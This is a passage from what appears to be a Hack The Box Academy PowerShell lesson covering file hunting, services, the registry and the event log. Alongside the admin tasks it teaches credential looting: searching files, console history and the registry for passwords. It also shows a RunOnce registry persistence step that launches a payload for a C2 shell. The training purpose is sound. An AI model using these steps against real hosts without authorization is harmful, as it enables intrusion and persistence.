[Select-String](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.2) (`sls` as an alias) for those more familiar with using the Linux CLI, functions much in the same manner as `Grep` does or `findstr.exe` within the Windows Command-Prompt. It performs evaluations of input strings, file contents, and more based on regular expression (`regex`) pattern matching. When a match is found, `Select-String` will output the matching `line`, the `name` of the file, and the `line number` on which it was found by default.

### Find Interesting Files Within a Directory
When looking for interesting files, think about the most common file types we would use daily and start there. On a given day, we may write text files, a bit of Markdown, some Python, PowerShell, and many others. We want to look for those things when hunting through a host since it is where users and admins will interact most. We can start with `Get-ChildItem` and perform a recursive search through a folder. Let us test it out.

#### Beginning the Hunt
```powershell-session
PS C:\htb> Get-ChildItem -Path C:\Users\MTanaka\ -File -Recurse 

 Directory: C:\Users\MTanaka\Desktop\notedump\NoteDump

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---           4/26/2022  1:47 PM           1092 demo notes.md
-a---           4/22/2022  2:20 PM           1074 noteDump.py
-a---           4/22/2022  2:55 PM          61440 plum.sqlite
-a---           4/22/2022  2:20 PM            375 README.md
<SNIP>
```

We will notice that it quickly returns way too much information. Every file in every folder in the path specified was output to our console. We need to trim this down a bit. Let us use the condition of looking at the `name` for specific `filetype extensions`.To do so, we will pipe the output of Get-ChildItem through the `where` cmdlet to filter down our output. Let's test first by searching for the `*.txt` filetype extension.

#### Narrowing Our Search
```powershell-session
PS C:\htb> Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt")}

Directory: C:\Users\MTanaka\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/11/2022  3:32 PM            183 demo-notes.txt
-a---            4/4/2022  9:37 AM            188 q2-to-do.txt
-a---          10/12/2022 11:26 AM             14 test.txt
-a---            1/4/2022 11:23 PM            310 Untitled-1.txt

    Directory: C:\Users\MTanaka\Desktop\win-stuff

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---           5/19/2021 10:12 PM           7831 wmic.txt

    Directory: C:\Users\MTanaka\Desktop\Workshop\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-----            1/7/2022  4:39 PM            945 info.txt
```

This worked much more efficiently. We only returned the files that matched the file type `txt` because of our filter's `$_.Name` attribute. Now that we know it works, we can add the rest of the file types we will look for using an `-or` statement within the where filter.

#### Using `Or` To Expand our Treasure Hunt
```powershell-session
PS C:\htb> Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}

 Directory: C:\Users\MTanaka\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/11/2022  3:32 PM            183 demo-notes.txt
-a---          10/11/2022 10:22 AM           1286 github-creds.txt
-a---            4/4/2022  9:37 AM            188 q2-to-do.txt
-a---           9/18/2022 12:35 PM             30 notes.txt
-a---          10/12/2022 11:26 AM             14 test.txt
-a---           2/14/2022  3:40 PM           3824 remote-connect.ps1
-a---          10/11/2022  8:22 PM            874 treats.ps1
-a---            1/4/2022 11:23 PM            310 Untitled-1.txt

    Directory: C:\Users\MTanaka\Desktop\notedump\NoteDump

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---           4/26/2022  1:47 PM           1092 demo.md
-a---           4/22/2022  2:20 PM           1074 noteDump.py
-a---           4/22/2022  2:20 PM            375 README.md
```

Our string worked, and we are now retrieving `multiple filetypes` from Get-ChildItem! Now that we have our list of interesting files, we could turn around and `pipe` those objects into another cmdlet (`Select-String`) that searches through their content for interesting strings and keywords or phrases. Let us see this in action.

#### Basic Search Query
```powershell-session
PS C:\htb> Get-ChildItem -Path C:\Users\MTanaka\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"

CFP-Notes.txt:99:Lazzaro, N. (2004). Why we play games: Four keys to more emotion without story. Retrieved from:
notes.txt:3:- Password: F@ll2022!
wmic.txt:67:  wmic netlogin get name,badpasswordcount
wmic.txt:69:Are the screensavers password protected? What is the timeout? good use: see that all systems are
complying with policy evil use: find systems to walk up and use (assuming physical access is an option)
```

Keep in mind, Select-string is `not` case sensitive by default. If we wish for it to be, we can feed it the -CaseSensitive modifier. Now we will combine our original file search with our content filter.

#### Combining the Searches
```powershell-session
PS C:\htb> Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_. Name -like "*.txt" -or $_. Name -like "*.py" -or $_. Name -like "*.ps1" -or $_. Name -like "*.md" -or $_. Name -like "*.csv")} | sls "Password","credential","key","UserName"

New-PC-Setup.md:56:  - getting your vpn key
CFP-Notes.txt:99:Lazzaro, N. (2004). Why we play games: Four keys to more emotion without story. Retrieved from:
notes.txt:3:- Password: F@ll2022!
wmic.txt:54:  wmic computersystem get username
wmic.txt:67:  wmic netlogin get name,badpasswordcount
wmic.txt:69:Are the screensavers password protected? What is the timeout? good use: see that all systems are
complying with policy evil use: find systems to walk up and use (assuming physical access is an option)
wmic.txt:83:  wmic netuse get Name,username,connectiontype,localname
```

Our commands in the pipeline are getting longer, but we can easily clean up our view to make it readable. Looking at our results, though, it was a much smoother process to feed our file list results into our keyword search. Notice that there are a few `new` additions in our command string. We added a line to have the command continue if an error occurs (`-ErrorAction SilentlyContinue`).

### Helpful Directories to Check

While looking for valuable files and other content, we can check many more valuable files in many different places. The list below contains just a few tips and tricks that can be used in our search for loot.

- Looking in a Users `\AppData\` folder is a great place to start. Many applications store `configuration files`, `temp saves` of documents, and more.
- A Users home folder `C:\Users\User\` is a common storage place; things like VPN keys, SSH keys, and more are stored. Typically in `hidden` folders. (`Get-ChildItem -Hidden`)
- The Console History files kept by the host are an endless well of information, especially if you land on an administrator's host. You can check two different points:
    - `C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`
    - `Get-Content (Get-PSReadlineOption).HistorySavePath`
- Checking a user's clipboard may also yield useful information. You can do so with `Get-Clipboard`
- Looking at Scheduled tasks can be helpful as well.

---

# Working with Services

In our previous section, we discussed filtering and the pipeline using an example of finding services on the host from the eyes of a pentester. In this section, we will dive deeper into this and flip it on its head. We are going to look at it from the eyes of an administrator.

>**Scenario:** Mr. Tanaka messaged the Helpdesk stating that he noticed a window pop up earlier in the day and thought it was just Windows updates running, as lots of information flashed by in the window. However, now he reports that alerts stating that Defender is turned off also popped up, and his host is acting sluggish. We need to look into this, determine what services related to Defender are shut off, and enable them again if we can. Later we will look into the event logs and see what happened.

Service administration is crucial in managing hosts and ensuring our security posture remains unchanged. This section will cover how to query, start, stop, and edit services and their permissions as needed. We will also discuss ways to interact with them locally and remotely. It is time to dive in and acquire our next CLI Kung-Fu Belt.

## What Are Services and How Do We Interact with Them Using Powershell?

Services in the Windows Operating system at their core are singular instances of a component running in the background that manages and maintains processes and other needed components for applications used on the host. Services usually do not require interaction from the user and have no tangible interface for them to interact with. They also exist as a singular instance of the service on the host, while a service can maintain multiple instances of a process. A process can be considered a temporary container for a user or application to perform tasks. Windows has three categories of services: Local Services, Network Services, and System Services. Many different services (including the core components within the Windows operating system) handle multiple instances of processes simultaneously. PowerShell provides us with the module `Microsoft.PowerShell.Management`, which contains several cmdlets for interacting with Services. As with everything in PowerShell, if you are unsure where to start or what cmdlet you need, take advantage of the built-in help to get you started.

#### Getting Help (Services)
```powershell-session
PS C:\htb> Get-Help *-Service  

Name                              Category  Module                    Synopsis
----                              --------  ------                    --------
Get-Service                       Cmdlet    Microsoft.PowerShell.Man… …
New-Service                       Cmdlet    Microsoft.PowerShell.Man… …
Remove-Service                    Cmdlet    Microsoft.PowerShell.Man… …
Restart-Service                   Cmdlet    Microsoft.PowerShell.Man… …
Resume-Service                    Cmdlet    Microsoft.PowerShell.Man… …
Set-Service                       Cmdlet    Microsoft.PowerShell.Man… …
Start-Service                     Cmdlet    Microsoft.PowerShell.Man… …
Stop-Service                      Cmdlet    Microsoft.PowerShell.Man… …
Suspend-Service                   Cmdlet    Microsoft.PowerShell.Man… …
```

Now, let us start our triage of Mr. Tanaka's host and see what is going on.

>**Note:** Keep in mind that to manage or modify services outside of running queries, we will need to have the correct permissions to do so. This means our user should ideally be a local administrator on the host or have been given the permissions from the domain groups they are a member of. Opening PowerShell in an administrative context would also work.

### Investigating Running Services

We first need to get a quick running list of services from our target host. Services can have a status set as Running, Stopped, or Paused and can be set up to start manually (user interaction), automatically (at system startup), or on a delay after system boot. Users with administrative privileges can usually create, modify, and delete services. Misconfigurations around service permissions are a common privilege escalation vector on Windows systems.

#### Get-Service
```powershell-session
PS C:\htb> Get-Service | ft DisplayName,Status 

DisplayName                                                                         Status
-----------                                                                         ------

Adobe Acrobat Update Service                                                       Running
OpenVPN Agent agent_ovpnconnect                                                    Running
Adobe Genuine Monitor Service                                                      Running
Adobe Genuine Software Integrity Service                                           Running
Application Layer Gateway Service                                                  Stopped
Application Identity                                                               Stopped
Application Information                                                            Running
Application Management                                                             Stopped
App Readiness                                                                      Stopped
Microsoft App-V Client                                                             Stopped
AppX Deployment Service (AppXSVC)                                                  Running
AssignedAccessManager Service                                                      Stopped
Windows Audio Endpoint Builder                                                     Running
Windows Audio                                                                      Running
ActiveX Installer (AxInstSV)                                                       Stopped
GameDVR and Broadcast User Service_172433                                          Stopped
BitLocker Drive Encryption Service                                                 Running
Base Filtering Engine                                                              Running
<SNIP> 

PS C:\htb> Get-Service | measure  

Count             : 321
```

To make it a little clearer to run, we piped our service listing into `format-table` and chose the properties `DisplayName` and `Status` to display in our console. On the second command issued, we measured the number of services that appear in the listing just to get a sense of how many we are working with. `321` services are a lot to scroll through and work with at once, so we need to pare it down a bit more. From Mr. Tanaka's request, he mentioned a potential issue with Windows Defender, so let us filter out any services not related to that.

#### Precision Look at Defender
```powershell-session
PS C:\htb> Get-Service | where DisplayName -like '*Defender*' | ft DisplayName,ServiceName,Status

DisplayName                                             ServiceName  Status
-----------                                             -----------  ------
Windows Defender Firewall                               mpssvc      Running
Windows Defender Advanced Threat Protection Service     Sense       Stopped
Microsoft Defender Antivirus Network Inspection Service WdNisSvc    Running
Microsoft Defender Antivirus Service                    WinDefend   Stopped
```

Now we can see just the services related to `Defender,` and we can see that for some reason, the Microsoft Defender Antivirus Service (`WinDefend`) is indeed turned off. For now, to ensure the protection of Mr. Tanaka's host, let us try and turn it back on using the Start-Service cmdlet.

#### Resume / Start / Restart a Service
```powershell-session
PS C:\htb> Start-Service WinDefend
```

As we ran the cmdlet `Start-Service` as long as we did not get an error message like `"ParserError: This script contains malicious content and has been blocked by your antivirus software."` or others, the command executed successfully. We can check again by querying the service.

#### Checking Our Work
```powershell-session
PS C:\htb>  get-service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Microsoft Defender Antivirus Service
```

Notice how we utilized the service `Name` to start and query the service instead of anything in the DisplayName. For now, Defender is back up and running, so the first mission is accomplished. While here, let us look around and see what else is happening. As we look through the services a bit more to see what is there, we notice a Service with an odd DisplayName.

```powershell-session
PS C:\htb> get-service 

Stopped  SmsRouter          Microsoft Windows SMS Router Service.
Stopped  SNMPTrap           SNMP Trap
Stopped  spectrum           Windows Perception Service
Running  Spooler            Totally still used for Print Spooli...
Stopped  sppsvc             Software Protection
Running  SSDPSRV            SSDP Discovery
```

We cannot find any information on this particular service, and its DisplayName having changed is odd, so to be safe, we will stop the service for now and let one of our team members on the security team investigate it.

```powershell-session
PS C:\htb> Stop-Service Spooler 

PS C:\htb> Get-Service Spooler 

Status   Name               DisplayName
------   ----               -----------
Stopped  spooler            Totally still used for Print Spooli...
```

Now we can see that using the Stop-Service, we stopped the operating status of the `Spooler` service. Now that we have stopped the service let us set the startup type of the service now from Automatic to Disabled until further investigation can be taken.

#### Set-Service
```powershell-session
PS C:\htb> get-service spooler | Select-Object -Property Name, StartType, Status, DisplayName

Name    StartType  Status DisplayName
----    ---------  ------ -----------
spooler Automatic Stopped Totally still used for Print Spooling...


PS C:\htb> Set-Service -Name Spooler -StartType Disabled

PS C:\htb> Get-Service -Name Spooler | Select-Object -Property StartType 

StartType
---------
 Disabled
```

Ok, now our Spooler service has been stopped, and its Startup changed to Disabled for now. Modifying a running service is reasonably straightforward. Ensure that if you attempt to make any modifications, you are an Administrator for the host or on the domain. Removing services in PowerShell is difficult right now. The cmdlet `Remove-Service` only works if you are using PowerShell version 7. By default, our hosts will open and run PowerShell version 5.1. For now, if you wish to remove a service and its entries, use the `sc.exe` tool.

---

## How Do We Interact with Remote Services using PowerShell?

Now that we know how to work with services, let us look at how we can interact with remote hosts. Since Mr. Tanaka's host is in a domain, we can easily query and check the running services on other hosts. The `-ComputerName` parameter allows us to specify that we want to query a remote host.

#### Remotely Query Services
```powershell-session
PS C:\htb> get-service -ComputerName ACADEMY-ICL-DC

Status   Name               DisplayName
------   ----               -----------
Running  ADWS               Active Directory Web Services
Stopped  AppIDSvc           Application Identity
Stopped  AppMgmt            Application Management
Stopped  AppReadiness       App Readiness
Stopped  AppXSvc            AppX Deployment Service (AppXSVC)
Running  BFE                Base Filtering Engine
Stopped  BITS               Background Intelligent Transfer Ser...
<SNIP>  
```

#### Filtering our Output
```powershell-session
PS C:\htb> Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}

Status   Name               DisplayName
------   ----               -----------
Running  ADWS               Active Directory Web Services
Running  BFE                Base Filtering Engine
Running  COMSysApp          COM+ System Application
Running  CoreMessagingRe... CoreMessaging
Running  CryptSvc           Cryptographic Services
Running  DcomLaunch         DCOM Server Process Launcher
Running  Dfs                DFS Namespace
Running  DFSR               DFS Replication
```

One interesting thing of note here is that since PowerShell handles everything as an `object`, even the output from a remote command, we can use the PowerShell pipeline to dissect an object's properties with `Where-Object`. Our results returned only the services with a status when it was run of `Running`. We can use these combinations for any number of things. One great example would be to query our hosts for a specific property, such as if the status was Running, if a DisplayName is set to something specific, etc. Regarding remote interactions, we can also use the `Invoke-Command` cmdlet. Let us try and query multiple hosts and see the status of the `UserManager` service.

### Invoke-Command
```powershell-session
PS C:\htb> invoke-command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}

Status   Name               DisplayName                            PSComputerName
------   ----               -----------                            --------------
Running  windefend          Microsoft Defender Antivirus Service   LOCALHOST
Running  windefend          Windows Defender Antivirus Service     ACADEMY-ICL-DC
```

Let us break this down now:

- `Invoke-Command`: We are telling PowerShell that we want to run a command on a local or remote computer.
- `Computername`: We provide a comma-defined list of computer names to query.
- `ScriptBlock {commands to run}`: This portion is the enclosed command we want to run on the computer. For it to run, we need it to be enclosed in {}.
  
---

### Working the Registry

It's time to level our skills again and tackle one of the more complicated aspects of the Windows operating system, the `Registry`.

---
### What Is The Windows Registry?

`Registry` can be considered a hierarchical tree that contains two essential elements: `Keys`  and `values`. This tree stores all the required information for the operating system and software installed to run under subtress.

This info can be anything from settings to installation directories to specific options  

### What are Keys

`Keys`, in essence, are containers that represent a specific component of the PC. Keys can contain other keys and values as data. These entries can take many forms, and naming contexts only require that a Key be named using alphanumeric (printable) characters and is not case-sensitive

#### Keys (Green)

![Registry Editor showing path: HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Adobe Acrobat\10.0\Installer. Right pane displays 'DisableMaintenance' with value 1.](https://academy.hackthebox.com/storage/modules/167/registry.png)

### Registry Key Files

A host systems Registry `root keys` are stored in several different files and can be accessed from `C:\Windows\System32\Config\`. Along with these Key files, registry hives are held throughout the host in various other places.

#### Root Registry Keys

```powershell-session
PS C:\htb> Get-ChildItem C:\Windows\System32\config\

    Directory: C:\Windows\System32\config

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----           12/7/2019  4:14 AM                Journal
d----           12/7/2019  4:14 AM                RegBack
d----           4/28/2021 11:43 AM                systemprofile
d----           9/18/2021 12:22 AM                TxR
-a---          10/12/2022 10:06 AM         786432 BBI
-a---           1/20/2021  5:13 PM          28672 BCD-Template
-a---          10/18/2022 11:14 AM       38273024 COMPONENTS
-a---          10/12/2022 10:06 AM        1048576 DEFAULT
-a---          10/15/2022  9:33 PM       13463552 DRIVERS
-a---           1/27/2021  2:54 PM          32768 ELAM
-a---          10/12/2022 10:06 AM         131072 SAM
-a---          10/12/2022 10:06 AM          65536 SECURITY
-a---          10/12/2022 10:06 AM      168034304 SOFTWARE
-a---          10/12/2022 10:06 AM       29884416 SYSTEM
-a---          10/12/2022 10:06 AM           1623 VSMIDK
```

For a detailed list of all Registry Hives and their supporting files within the OS, we can look [HERE](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives). Now let's discuss Values within the Registry.

### What Are Values

`Values` represent data in the form of objects that pertain to that specific Key. These values consist of a name, a type specification, and the required data to identify what it's for.

#### Values

![Registry Editor showing path: HKEY_LOCAL_MACHINE\SOFTWARE\Adobe\Adobe Acrobat\10.0\Installer. Right pane displays 'DisableMaintenance' with value 1.](https://academy.hackthebox.com/storage/modules/167/registry-values.png)

We can reference the complete list of Registry Key Values [HERE](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types). In all, there are 11 different value types that can be configured.

### Registry Hives

Each Windows host has a set of predefined Registry keys that maintain the host and settings required for use. Below is a breakdown of each hive and what can be found referenced within.

#### Hive Breakdown

|**Name**|**Abbreviation**|**Description**|
|---|---|---|
|HKEY_LOCAL_MACHINE|`HKLM`|This subtree contains information about the computer's `physical state`, such as hardware and operating system data, bus types, memory, device drivers, and more.|
|HKEY_CURRENT_CONFIG|`HKCC`|This section contains records for the host's `current hardware profile`. (shows the variance between current and default setups) Think of this as a redirection of the [HKLM](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc739525\(v=ws.10\)) CurrentControlSet profile key.|
|HKEY_CLASSES_ROOT|`HKCR`|Filetype information, UI extensions, and backward compatibility settings are defined here.|
|HKEY_CURRENT_USER|`HKCU`|Value entries here define the specific OS and software settings for each specific user. `Roaming profile` settings, including user preferences, are stored under HKCU.|
|HKEY_USERS|`HKU`|The `default` User profile and current user configuration settings for the local computer are defined under HKU.|
There are other predefined keys for the Registry, but they are specific to certain versions and regional settings in Windows.

### How Do We Access the Information?

From the CLI, we have several options to access the Registry and manage our keys. The first is using [reg.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg). `Reg` is a dos executable explicitly made for use in managing Registry settings. The second is using the `Get-Item` and `Get-ItemProperty` cmdlets to read keys and values. If we wish to make a change, the use of New-ItemProperty will do the trick.

### Querying Registry Entries

We will look at using `Get-Item` and `Get-ChildItem` first. Below we can see the output from using Get-Item and piping the result to Select-Object.

#### Get-Item
```powershell-session
PS C:\htb> Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property  

SecurityHealth
RtkAudUService
WavesSvc
DisplayLinkTrayApp
LogiOptions
Acrobat Assistant 8.0
(default)
Focusrite Notifier
AdobeGCInvoker-1.0
```

It's a simple output and only shows us the name of the services/applications currently running. If we wished to see each key and object within a hive, we could also use `Get-ChildItem` with the `-Recurse` parameter like so:

#### Recursive Search
```powershell-session
PS C:\htb> Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse

Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
<SNIP>
Name                           Property
----                           --------
7zFM.exe                       (default) : C:\Program Files\7-Zip\7zFM.exe
                               Path      : C:\Program Files\7-Zip\
Acrobat.exe                    (default) : C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe
                               Path      : C:\Program Files\Adobe\Acrobat DC\Acrobat\
AcrobatInfo.exe                (default) : C:\Program Files\Adobe\Acrobat DC\Acrobat\AcrobatInfo.exe
                               Path      : C:\Program Files\Adobe\Acrobat DC\Acrobat\
AcroDist.exe                   Path      : C:\Program Files\Adobe\Acrobat DC\Acrobat\
                               (default) : C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrodist.exe
Ahk2Exe.exe                    (default) : C:\Program Files\AutoHotkey\Compiler\Ahk2Exe.exe
AutoHotkey.exe                 (default) : C:\Program Files\AutoHotkey\AutoHotkey.exe
chrome.exe                     (default) : C:\Program Files\Google\Chrome\Application\chrome.exe
                               Path      : C:\Program Files\Google\Chrome\Application
cmmgr32.exe                    CmNative          : 2
                               CmstpExtensionDll : C:\Windows\System32\cmcfg32.dll
CNMNSST.exe                    (default) : C:\Program Files (x86)\Canon\IJ Network Scanner Selector EX\CNMNSST.exe
                               Path      : C:\Program Files (x86)\Canon\IJ Network Scanner Selector EX
devenv.exe                     (default) : "C:\Program Files\Microsoft Visual
                               Studio\2022\Community\common7\ide\devenv.exe"
dfshim.dll                     UseURL : 1
```

Now we snipped the output because it is expanding and showing each key and associated values within the `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion` key. We can make our output easier to read using the `Get-ItemProperty` cmdlet. Let's try that same query but with `Get-ItemProperty`.

#### Get-ItemProperty

```powershell-session
PS C:\htb> Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

SecurityHealth        : C:\Windows\system32\SecurityHealthSystray.exe
RtkAudUService        : "C:\Windows\System32\DriverStore\FileRepository\realtekservice.inf_amd64_85cff5320735903
                        d\RtkAudUService64.exe" -background
WavesSvc              : "C:\Windows\System32\DriverStore\FileRepository\wavesapo9de.inf_amd64_d350b8504310bbf5\W
                        avesSvc64.exe" -Jack
DisplayLinkTrayApp    : "C:\Program Files\DisplayLink Core Software\DisplayLinkTrayApp.exe" -basicMode
LogiOptions           : C:\Program Files\Logitech\LogiOptions\LogiOptions.exe /noui
Acrobat Assistant 8.0 : "C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrotray.exe"
```

Now let's break this down. We issued the `Get-ItemProperty` command, specified out `path` as looking into the Registry, and specified the key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. The output provides us with the `name` of the services started and the `value` that was used to run them (the path they were executed from). This Registry key is used to `start` services/applications when a user `logs in` to the host.

#### Reg.exe

```powershell-session
PS C:\htb> reg query HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip

HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip
    Path64    REG_SZ    C:\Program Files\7-Zip\
    Path    REG_SZ    C:\Program Files\7-Zip\
```

We queried the `HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip` key with Reg.exe, which provided us with the associated values. We can see that `two` values are set, `Path` and `Path64`, the ValueType is a `Reg_SZ` value which specifies that it contains a Unicode or ASCII string, and that value is the path to 7-Zip `C:\Program Files\7-Zip\`.

### Finding Info In The Registry

For us as pentesters and administrators, finding data within the Registry is a must-have skill. This is where `Reg.exe` really shines for us. We can use it to search for keywords and strings like `Password` and `Username` through key and value names or the data contained. Before we put it to use, let's break down the use of `Reg Query`. We will look at the command string `REG QUERY HKCU /F "password" /t REG_SZ /S /K`.

- `Reg query`: We are calling on Reg.exe and specifying that we want to query data.
- `HKCU`: This portion is setting the path to search. In this instance, we are looking in all of HKey_Current_User.
- `/f "password"`: /f sets the pattern we are searching for. In this instance, we are looking for "Password".
- `/t REG_SZ`: /t is setting the value type to search. If we do not specify, reg query will search through every type.
- `/s`: /s says to search through all subkeys and values recursively.
- `/k`: /k narrows it down to only searching through Key names.

#### Searching With Reg Query

```powershell-session
PS C:\htb>  REG QUERY HKCU /F "Password" /t REG_SZ /S /K

HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Winlogon\PasswordExpiryNotification
    NotShownErrorTime    REG_SZ    08::23::24, 2022/10/19
    NotShownErrorReason    REG_SZ    GetPwdResetInfoFailed

End of search: 2 match(es) found.
```

Our results from this query could be more exciting, but it's still worth taking a look and using a similar search for other keywords and phrases like Username, Credentials, and Keys. We could be surprised by what we find. As we can see, querying registry keys and values is relatively easy. What if we want to set a new value or create a new key?

### Creating and Modifying Registry Keys and Values

When dealing with the modification or creation of `new keys and values`, we can use standard PowerShell cmdlets like `New-Item`, `Set-Item`, `New-ItemProperty`, and `Set-ItemProperty` or utilize `Reg.exe` again to make the changes we need. Let's try and create a new Registry Key below. For our example, we will create a new test key in the RunOnce hive `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` named `TestKey`. By placing the key and value in RunOnce, after it executes, it will be deleted.

>Scenario: We have landed on a host and can add a new registry key for persistence. We need to set a key named `TestKey` and a value of `C:\Users\htb-student\Downloads\payload.exe` that tells RunOnce to run our payload we leave on the host the next time the user logs in. This will ensure that if the host restarts or we lose access, the next time the user logs in, we will get a new shell.

#### New Registry Key
```powershell-session
PS C:\htb> New-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name TestKey

    Hive: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

Name                           Property
----                           --------
TestKey   
```

We now have a new key within the RunOnce key. By specifying the `-Path` parameter, we avoid changing our location in the shell to where we want to add a key in the Registry, letting us work from anywhere as long as we specify the absolute path. Let's set a Property and a value now.

#### Set New Registry Item Property
```powershell-session
PS C:\htb>  New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access" -PropertyType String -Value "C:\Users\htb-student\Downloads\payload.exe"

access       : C:\Users\htb-student\Downloads\payload.exe
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\
               TestKey
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
PSChildName  : TestKey
PSDrive      : HKCU
PSProvider   : Microsoft.PowerShell.Core\Registry

```

After using New-ItemProperty to set our value named `access` and specifying the value as `C:\Users\htb-student\Downloads\payload.exe` we can see in the results that our value was created successfully, and the corresponding information, such as path location and Key name. Just to show that our key was created, we can see the new key and its values in the image below from the GUI Registry editor.

#### TestKey Creation

![Registry Editor showing path: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey. Right pane displays 'access' with path to 'C:\Users\htb-student\Downloads\payload.exe'.](https://academy.hackthebox.com/storage/modules/167/testkeys.png)

If we wanted to add the same key/value pair using Reg.exe, we would do so like this:

Code: powershell

```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" /v access /t REG_SZ /d "C:\Users\htb-student\Downloads\payload.exe"  
```

Now in a real pentest, we would have left an executable payload on the host, and in the instance that the host reboots or the user logs in, we would acquire a new shell to our C2. This value doesn't do much for us right now, so let's practice deleting it.

#### Delete Reg properties
```powershell-session
PS C:\htb> Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access"

PS C:\htb> Get-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey

```

If no error window popped up, our key/value pair was deleted successfully. However, this is one of those things you should be extremely careful with. Removing entries from the Windows Registry could negatively affect the host and how it functions. Be sure you know what it is you are removing before. In the wise words of Uncle Ben, "`With great power comes great responsibility.`"

# Working with the Windows Event Log

---

From a SOC Analyst or IT Administrator's perspective, monitoring, collecting, and categorizing events occurring on all machines across the network is an invaluable source of information for defenders proactively analyzing and protecting their network from suspicious activity. On the other hand, attackers can see this as an opportunity to gain insight into the target environment, disrupt the flow of information, and as a way to hide their tracks. As we will see in later modules, sometimes we can find juicy information such as credentials hiding in event logs as a target system that we compromise during a penetration test. Other times, enumerating event logs can help us understand the level of logging in the environment (are just the defaults in place, or has the target organization configured more granular logging?). In this section, we will discuss the following:

- What is the Windows Event Log?
- What information does it log, and where does it store this information?
- Interacting with the Event Log via the `wevtutil` command line utility
- Interacting with the Event Log using PowerShell cmdlets
  

## What is the Windows Event Log?

To kickstart our journey into gaining a thorough understanding of the Windows Event Log, there are a few key concepts that we need to define before diving in. These concepts will become the base upon which everything else will be built. The first one that needs to be explained is an `event` definition. Simply put, an `event` is any action or occurrence that can be identified and classified by a system's hardware or software. `Events` can be generated or triggered through a variety of different ways including some of the following:

- User-Generated Events
    - Movement of a mouse, typing on a keyboard, other user-controlled peripherals, etc.
- Application Generated Events
    - Application updates, crashes, memory usage/consumption, etc.
- System Generated Events
    - System uptime, system updates, driver loading/unloading, user login, etc.

  
This is where our second key concept, known as `event logging` comes into play.

[Event Logging](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging) as defined by Microsoft:

"`...provides a standard, centralized way for applications (and the operating system) to record important software and hardware events.`"

This definition sums up the question quite nicely. However, let us attempt to break it down a bit. As we discussed beforehand, there are a lot of events that are being triggered or generated concurrently on a system. Each event will have its own source that provides the information and details behind the event in its own format. So how does it handle all of this information?

Windows attempts to resolve this issue by providing a standardized approach to recording, storing, and managing events and event information through a service known as the `Windows Event Log`.

#### Event Log Categories and Types

The main four log categories include application, security, setup, and system. Another type of category also exists called `forwarded events`.

|Log Category|Log Description|
|---|---|
|System Log|The system log contains events related to the Windows system and its components. A system-level event could be a service failing at startup.|
|Security Log|Self-explanatory; these include security-related events such as failed and successful logins, and file creation/deletion. These can be used to detect various types of attacks that we will cover in later modules.|
|Application Log|This stores events related to any software/application installed on the system. For example, if Slack has trouble starting it will be recorded in this log.|
|Setup Log|This log holds any events that are generated when the Windows operating system is installed. In a domain environment, events related to Active Directory will be recorded in this log on domain controller hosts.|
|Forwarded Events|Logs that are forwarded from other hosts within the same network.|
#### Event Types

